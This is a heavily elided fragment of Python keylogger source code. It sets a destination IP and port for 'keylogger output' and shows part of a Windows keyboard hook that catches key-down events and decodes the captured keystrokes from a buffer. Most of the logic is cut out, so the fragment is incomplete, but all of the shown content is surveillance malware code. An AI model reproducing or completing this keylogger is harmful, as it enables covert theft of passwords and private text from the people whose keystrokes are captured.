...
destination_IP = "127.0.0.1"  #destination IP for keylogger output
destination_port = 1337  #destination port for keylogger output
    ...
    if wParam == WM_KEYDOWN:
        ...
        if n > 0:
            if keyboard.vkCode == WM_RETURN:
                ...
                content = string_at(buf).decode('latin-1')
